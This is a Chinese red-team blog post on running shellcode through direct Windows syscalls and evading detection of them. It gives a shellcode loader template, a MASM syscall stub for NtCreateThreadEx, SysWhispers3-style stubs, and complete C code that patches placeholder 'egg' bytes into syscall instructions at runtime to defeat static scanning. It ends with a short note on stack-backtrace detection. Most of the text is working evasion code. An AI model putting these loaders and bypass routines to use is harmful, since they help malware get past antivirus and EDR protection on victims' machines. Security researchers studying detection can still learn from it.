#  syscall的检测与绕过

原创 ziansec  [ 红队蓝军 ](javascript:void\(0\);)

**红队蓝军** ![]()

微信号 Xx_Security

功能介绍 一群热爱网络安全的人，知其黑，守其白。不限于红蓝对抗，web，内网，二进制。

____

___发表于_

收录于合集

#syscall 2 个

#红队 41 个

## 普通调用

    
    
    #include <iostream>  
    #include <windows.h>  
      
    int main()  
    {  
     unsigned char shellcode[] = "";  
        void* exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT,  
            PAGE_EXECUTE_READWRITE);  
        memcpy(exec, shellcode, sizeof shellcode);  
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec, 0, 0, NULL);  
        Sleep(1000);  
        return 0;  
    }  
    

![](https://gitee.com/fuli009/images/raw/master/public/20230104154228.png)

此时的调用是非常明显的，能看到Ntdll中NtCreateThread的调用。

## syscall调用

    
    
    #include <iostream>  
    #include <Windows.h>  
    EXTERN_C NTSTATUS NtCreateThreadEx  
    (  
     OUT PHANDLE hThread,  
     IN ACCESS_MASK DesiredAccess,  
     IN PVOID ObjectAttributes,  
     IN HANDLE ProcessHandle,  
     IN PVOID lpStartAddress,  
     IN PVOID lpParameter,  
     IN ULONG Flags,  
     IN SIZE_T StackZeroBits,  
     IN SIZE_T SizeOfStackCommit,  
     IN SIZE_T SizeOfStackReserve,  
     OUT PVOID lpBytesBuffer  
    );  
    int main()  
    {  
     HANDLE pHandle = NULL;  
     HANDLE tHandle = NULL;  
     unsigned char shellcode[] = "";  
     void* exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT,  
      PAGE_EXECUTE_READWRITE);  
     memcpy(exec, shellcode, sizeof shellcode);  
     HMODULE hModule = LoadLibrary(L"ntdll.dll");  
     pHandle = GetCurrentProcess();  
     NtCreateThreadEx(&tHandle, 0x1FFFFF, NULL, pHandle, exec, NULL, FALSE,  
      NULL, NULL, NULL, NULL);  
     Sleep(1000);  
     CloseHandle(tHandle);  
     CloseHandle(pHandle);  
    }  
    

通过汇编直接NtCreateThreadEx在函数种通过syscall进入ring0

![](https://gitee.com/fuli009/images/raw/master/public/20230104154244.png)

    
    
    .code  
      
    NtCreateThreadEx proc  
       mov r10,rcx  
       mov eax,0C5h  
       syscall  
       ret  
    NtCreateThreadEx endp  
      
    end  
    

![](https://gitee.com/fuli009/images/raw/master/public/20230104154245.png)![](https://gitee.com/fuli009/images/raw/master/public/20230104154247.png)![](https://gitee.com/fuli009/images/raw/master/public/20230104154248.png)

通过procmon进行监控

![](https://gitee.com/fuli009/images/raw/master/public/20230104154253.png)

此时直接通过我们的主程序进入ring0

## syscall的检测与绕过

ntdll中syscall被执行的格式大致

    
    
    mov r10, rcx  
    mov eax, *syscall number*  
    syscall  
    ret  
    

我们可以通过检测`mov r10, rcx`类似的代码来确定程序是否直接进行系统调用。

但是很容易被bypass

    
    
    mov r11,rcx  
    mov r10,r11  
    

而且还可以写出很多不一样的写法，显然这个方式是不行的。很轻易就会被bypass。

当然也可以检测syscall指令，但是这个指令可以同int 2e中断门进0环的方式绕过，也可以加一个int 2e的规则。

    
    
    objdump --disassemble -M intel "D:\C++ Project\bypass\syscall\x64\Release\syscall.exe" | findstr "syscall"  
    

![](https://gitee.com/fuli009/images/raw/master/public/20230104154254.png)

syscall也可以不直接写写死在文件种，比如先用垃圾指令写死在文件中，然后在运行的时候对这些垃圾指令进行修改重新为syscall，达到静态绕过的效果。

这也正是SysWhispers3为了规避检测做的升级之一，称为EGG的手段。

![](https://gitee.com/fuli009/images/raw/master/public/20230104154256.png)

可以像这样编写ntapi

    
    
    NtAllocateVirtualMemory PROC  
      mov [rsp +8], rcx          ; Save registers.  
      mov [rsp+16], rdx  
      mov [rsp+24], r8  
      mov [rsp+32], r9  
      sub rsp, 28h  
      mov ecx, 003970B07h        ; Load function hash into ECX.  
      call SW2_GetSyscallNumber  ; Resolve function hash into syscall number.  
      add rsp, 28h  
      mov rcx, [rsp +8]          ; Restore registers.  
      mov rdx, [rsp+16]  
      mov r8, [rsp+24]  
      mov r9, [rsp+32]  
      mov r10, rcx  
      DB 77h                     ; "w"  
      DB 0h                      ; "0"  
      DB 0h                      ; "0"  
      DB 74h                     ; "t"  
      DB 77h                     ; "w"  
      DB 0h                      ; "0"  
      DB 0h                      ; "0"  
      DB 74h                     ; "t"  
      ret  
    NtAllocateVirtualMemory ENDP  
    

这个w00tw00t就是一个垃圾指令，我们将在执行的过程中重新替换为syscall

    
    
    DB 77h                     ; "w"  
    DB 0h                      ; "0"  
    DB 0h                      ; "0"  
    DB 74h                     ; "t"  
    DB 77h                     ; "w"  
    DB 0h                      ; "0"  
    DB 0h                      ; "0"  
    DB 74h                     ; "t"  
    

更改指令代码：

    
    
    #include <stdio.h>  
    #include <stdlib.h>  
    #include <Windows.h>  
    #include <psapi.h>  
      
    #define DEBUG 0  
      
    HMODULE GetMainModule(HANDLE);  
    BOOL GetMainModuleInformation(PULONG64, PULONG64);  
    void FindAndReplace(unsigned char[], unsigned char[]);  
      
    HMODULE GetMainModule(HANDLE hProcess)  
    {  
        HMODULE mainModule = NULL;  
        HMODULE* lphModule;  
        LPBYTE lphModuleBytes;  
        DWORD lpcbNeeded;  
      
        // First call needed to know the space (bytes) required to store the modules' handles  
        BOOL success = EnumProcessModules(hProcess, NULL, 0, &lpcbNeeded);  
      
        // We already know that lpcbNeeded is always > 0  
        if (!success || lpcbNeeded == 0)  
        {  
            printf("[-] Error enumerating process modules\n");  
            // At this point, we already know we won't be able to dyncamically  
            // place the syscall instruction, so we can exit  
            exit(1);  
        }  
        // Once we got the number of bytes required to store all the handles for  
        // the process' modules, we can allocate space for them  
        lphModuleBytes = (LPBYTE)LocalAlloc(LPTR, lpcbNeeded);  
      
        if (lphModuleBytes == NULL)  
        {  
            printf("[-] Error allocating memory to store process modules handles\n");  
            exit(1);  
        }  
        unsigned int moduleCount;  
      
        moduleCount = lpcbNeeded / sizeof(HMODULE);  
        lphModule = (HMODULE*)lphModuleBytes;  
      
        success = EnumProcessModules(hProcess, lphModule, lpcbNeeded, &lpcbNeeded);  
      
        if (!success)  
        {  
            printf("[-] Error enumerating process modules\n");  
            exit(1);  
        }  
      
        // Finally storing the main module  
        mainModule = lphModule[0];  
      
        // Avoid memory leak  
        LocalFree(lphModuleBytes);  
      
        // Return main module  
        return mainModule;  
    }  
      
    BOOL GetMainModuleInformation(PULONG64 startAddress, PULONG64 length)  
    {  
        HANDLE hProcess = GetCurrentProcess();  
        HMODULE hModule = GetMainModule(hProcess);  
        MODULEINFO mi;  
      
        GetModuleInformation(hProcess, hModule, &mi, sizeof(mi));  
      
        printf("Base Address: 0x%llu\n", (ULONG64)mi.lpBaseOfDll);  
        printf("Image Size:   %u\n", (ULONG)mi.SizeOfImage);  
        printf("Entry Point:  0x%llu\n", (ULONG64)mi.EntryPoint);  
        printf("\n");  
      
        *startAddress = (ULONG64)mi.lpBaseOfDll;  
        *length = (ULONG64)mi.SizeOfImage;  
      
        DWORD oldProtect;  
        VirtualProtect(mi.lpBaseOfDll, mi.SizeOfImage, PAGE_EXECUTE_READWRITE, &oldProtect);  
      
        return 0;  
    }  
      
    void FindAndReplace(unsigned char egg[], unsigned char replace[])  
    {  
      
        ULONG64 startAddress = 0;  
        ULONG64 size = 0;  
      
        GetMainModuleInformation(&startAddress, &size);  
      
        if (size <= 0) {  
            printf("[-] Error detecting main module size");  
            exit(1);  
        }  
      
        ULONG64 currentOffset = 0;  
      
        unsigned char* current = (unsigned char*)malloc(8*sizeof(unsigned char*));  
        size_t nBytesRead;  
      
        printf("Starting search from: 0x%llu\n", (ULONG64)startAddress + currentOffset);  
      
        while (currentOffset < size - 8)  
        {  
            currentOffset++;  
            LPVOID currentAddress = (LPVOID)(startAddress + currentOffset);  
            if(DEBUG > 0){  
                printf("Searching at 0x%llu\n", (ULONG64)currentAddress);  
            }  
            if (!ReadProcessMemory((HANDLE)((int)-1), currentAddress, current, 8, &nBytesRead)) {  
                printf("[-] Error reading from memory\n");  
                exit(1);  
            }  
            if (nBytesRead != 8) {  
                printf("[-] Error reading from memory\n");  
                continue;  
            }  
      
            if(DEBUG > 0){  
                for (int i = 0; i < nBytesRead; i++){  
                    printf("%02x ", current[i]);  
                }  
                printf("\n");  
            }  
      
            if (memcmp(egg, current, 8) == 0)  
            {  
                printf("Found at %llu\n", (ULONG64)currentAddress);  
                WriteProcessMemory((HANDLE)((int)-1), currentAddress, replace, 8, &nBytesRead);  
            }  
      
        }  
        printf("Ended search at:   0x%llu\n", (ULONG64)startAddress + currentOffset);  
        free(current);  
    }  
    

在`inceptor`中可以直接调用函数达到替换syscall的作用

    
    
    int main(int argc, char** argv) {  
      
        unsigned char egg[] = { 0x77, 0x00, 0x00, 0x74, 0x77, 0x00, 0x00, 0x74 }; // w00tw00t  
        unsigned char replace[] = { 0x0f, 0x05, 0x90, 0x90, 0xC3, 0x90, 0xCC, 0xCC }; // syscall; nop; nop; ret; nop; int3; int3  
      
        //####SELF_TAMPERING####  
        (egg, replace);  
      
        Inject();  
        return 0;  
    }  
    

但是这样依然很容易被检测，原因是有了更加准确的检测方式。

那就是通过栈回溯。

当你正常的程序使用系统调用的时候。

![](https://gitee.com/fuli009/images/raw/master/public/20230104154301.png)

此时你的流程是主程序模块->kernel32.dll->ntdll.dll->syscall，这样当0环执行结束返回3环的时候，这个返回地址应该是在ntdll所在的地址范围之内。

那么如果是你自己直接进行系统调用。

![](https://gitee.com/fuli009/images/raw/master/public/20230104154309.png)

此时当ring0返回的时候，rip将会是你的主程序模块内，而并不是在ntdll所在的范围内，这点是很容易被检测也是比较准确的一种检测方式。

  

加下方wx，拉你一起进群学习

![](https://gitee.com/fuli009/images/raw/master/public/20230104154310.png)

  

往期推荐

[

什么？你还不会webshell免杀？（十）

](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247504063&idx=1&sn=6ef2b411606302749b0afd84cbe52478&chksm=ce676a03f910e31549e7879dd54e8d6ba0228d98daa9618a260777822fb8f7eadb000fc74a44&scene=21#wechat_redirect)[

PPL攻击详解

](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247504039&idx=1&sn=f4235a5b16a9ec54990b9ca60e612c3a&chksm=ce676a1bf910e30d0fa66e47c56ff30c95d015c41c25e1ccd65f52ae6302c125d5731148c182&scene=21#wechat_redirect)[

绕过360核晶抓取密码

](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247504007&idx=1&sn=d05780700a2f285f9b6e2df58ea2ea57&chksm=ce676a3bf910e32d608babbcd14e62ef80c965c118b6b5fa0978f4346cceab39571d8b8a94ff&scene=21#wechat_redirect)[

什么？你还不会webshell免杀？（十）

](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247503993&idx=1&sn=6777c400219f28f3ec2d10a10eb88cd5&chksm=ce676ac5f910e3d32301ee99d320f870d9e68635cd21a7ef8c4e8853fd9309232d2335227122&scene=21#wechat_redirect)[

64位下使用回调函数实现监控

](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247503980&idx=1&sn=c62724ad4b3a98ed77402fae985ff94d&chksm=ce676ad0f910e3c6d09961a698175262647c2c2fbbf77f8f5ec4cd510160a137f6371d14f517&scene=21#wechat_redirect)[

什么？你还不会webshell免杀？（九）

](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247503754&idx=1&sn=0a8c57ce7ce89d10c292e3bc5cc5f6ed&chksm=ce677536f910fc20a5076d93c12a520c43a1c1a8fa36e30ace053ee3dcd12db38cc3782b7875&scene=21#wechat_redirect)[

一键击溃360全家桶+核晶

](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247503750&idx=1&sn=61f8d9ca458674d44de0019aeb39a875&chksm=ce67753af910fc2cb20170a97e7b519082c5f51805d6b86cc39b1469217e4c3539d61a9ba3f9&scene=21#wechat_redirect)[

域内持久化后门

](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247503705&idx=1&sn=7a6039810c41637e376757f306ab6745&chksm=ce6775e5f910fcf3226422091a3858b8064fa353320e48c4a4998ed5b89f51febe82e992309d&scene=21#wechat_redirect)  
![](https://gitee.com/fuli009/images/raw/master/public/20230104154312.png)

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

